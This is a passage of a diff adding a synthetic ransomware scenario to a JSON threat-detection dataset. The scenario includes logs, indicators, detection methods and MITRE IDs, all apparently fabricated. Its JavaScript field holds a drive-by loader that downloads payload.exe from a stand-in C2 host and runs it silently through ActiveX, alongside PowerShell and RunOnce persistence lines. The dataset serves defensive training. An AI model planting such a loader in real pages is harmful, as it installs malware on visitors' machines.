+        "T1486 - Data Encrypted for Impact"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate leverages malicious JavaScript embedded in a compromised internal web portal to execute ransomware loader on user machines via drive-by download.",
+      "technical_data": {
+        "web_server_logs": "2023-09-12 16:45:10 GET /portal/dashboard.html 200\n2023-09-12 16:45:11 GET /portal/scripts/malicious_loader.js 200\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "javascript_snippet": "var xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://malicious-c2.biz/payload.bin', true);\nxhr.responseType = 'arraybuffer';\nxhr.onload = function(e) {\n  if (this.status == 200) {\n    var blob = new Blob([this.response], {type: 'application/octet-stream'});\n    var link = document.createElement('a');\n    link.href = window.URL.createObjectURL(blob);\n    link.download = 'payload.exe';\n    link.click();\n    var shell = new ActiveXObject('WScript.Shell');\n    shell.Run('payload.exe /silent', 0, false);\n  }\n};\nxhr.send();",
+        "powershell_detection_log": "2023-09-12 16:45:15 INFO PowerShell command executed: Start-Process -FilePath C:\\Users\\user\\Downloads\\payload.exe -ArgumentList '/silent'",
+        "file_hashes": {
+          "payload.exe": {
+            "md5": "5d41402abc4b2a76b9719d911017c592",
+            "sha1": "7d793037a0760186574b0282f2f435e7f6c1e5f8",
+            "sha256": "3a7bd3e2360a3d1f1cbf9b5a1a0ddf1b2f3f42c6c8b5f7a2b9e5f9a1a4a3b7d9"
+          }
+        },
+        "process_creation_log": "Sep 12 16:45:20 host6 enterprise-pc6 Microsoft-Windows-Sysmon: New Process Created: Image: C:\\Users\\user\\Downloads\\payload.exe ParentImage: C:\\Windows\\System32\\iexplore.exe CommandLine: \"C:\\Users\\user\\Downloads\\payload.exe\" /silent",
+        "network_traffic_snippet": "16:45:11.123456 IP enterprise-pc6.49156 > malicious-c2.biz.http: GET /payload.bin HTTP/1.1",
+        "registry_modifications": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\PayloadLoader = \"C:\\Users\\user\\Downloads\\payload.exe\"",
+        "ransomware_behavior": "Payload.exe disables Windows Defender, encrypts personal and enterprise documents (.docx, .xlsx, .pdf, .pptx), creates ransom note 'HELP_RECOVER.txt' on user's desktop."
+      },
+      "indicators": [
+        "Compromised internal web portal serving malicious JavaScript",
+        "Drive-by download of payload.exe via JavaScript and ActiveX object",
+        "PowerShell command starting payload.exe with silent argument",
+        "Process creation by Internet Explorer spawning ransomware process",
+        "Outbound HTTP request to malicious C2 server",
+        "Registry RunOnce key for persistence",
+        "Ransom note file on user desktop"
+      ],
+      "detection_method": "Web proxy and IDS detect suspicious JS and downloads, browser process monitoring spots unusual child process, EDR detects PowerShell execution and process creation, registry monitoring alerts RunOnce persistence, network monitoring flags C2 connections, file integrity monitoring detects ransom notes.",
+      "relevant_mitre_techniques": [
+        "T1189 - Drive-by Compromise",
+        "T1105 - Ingress Tool Transfer",
+        "T1059.001 - PowerShell",
+        "T1547.001 - Registry Run Keys / Startup Folder",
+        "T1486 - Data Encrypted for Impact"
+      ]
+    }
+  ]
+}
